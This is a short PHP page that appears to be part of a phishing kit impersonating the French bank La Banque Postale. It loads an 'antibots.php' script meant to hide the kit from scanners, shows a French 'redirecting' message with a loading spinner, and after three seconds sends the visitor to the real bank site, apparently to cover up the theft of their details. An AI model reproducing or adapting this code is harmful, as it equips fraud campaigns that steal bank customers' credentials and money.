<?php

include("antibots.php");

    echo '<script type="text/javascript">'; 
    echo 'setTimeout(function(){window.top.location.href = "https://labanquepostale.fr";}, 3000);';
    echo '</script>';
?>

<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
.loader {
  border: 16px solid #f3f3f3;
  border-radius: 50%;
  border-top: 16px solid #103D9E;
  width: 80px;
  height: 80px;
  -webkit-animation: spin 2s linear infinite; /* Safari */
  animation: spin 2s linear infinite;
}

/* Safari */
@-webkit-keyframes spin {
  0% { -webkit-transform: rotate(0deg); }
  100% { -webkit-transform: rotate(360deg); }
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}
</style>
</head>
<body>

<center>
<h3 style="position: relative; top: 100px; color: green;">Vous avez choisi plutard. Vous allez être rédirigé ...</h3>

<div class="loader" style="position: relative; top: 100px;"></div><img src="images.jpg" width="100px" height="100px" style="position: relative; top: 110px;">
</center>
</body>
</html>